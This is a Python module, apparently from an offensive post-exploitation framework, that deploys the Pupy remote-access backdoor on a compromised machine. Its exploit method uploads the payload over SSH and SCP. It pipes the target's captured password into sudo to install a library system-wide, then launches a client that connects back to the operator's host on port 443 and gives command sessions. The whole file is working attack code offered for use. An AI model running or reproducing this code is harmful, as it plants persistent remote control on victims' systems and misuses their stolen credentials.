from backdoor import *

class Pupy(Backdoor):
    prompt = Fore.RED + "(pupy) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Pupy backdoor..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
        self.modules = {} 
        self.allow_modules = True

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S python pupy/pp.py simple --host " + self.core.localIP + ":443"

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print("Thanks to n1nj4sec for the pupy backdoor. Note that this script must be run with sudo.")        

        target.ssh.exec_command('rm -r pupy')
        target.scpFiles(self, 'backdoors/pupy/pupy', True)
        target.scpFiles(self, 'rpyc', True)
        target.ssh.exec_command("echo " + target.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
        raw_input("Please navigate to the backdoors/pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
        target.ssh.exec_command(self.get_command())
        
        raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")

        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self.get_command())
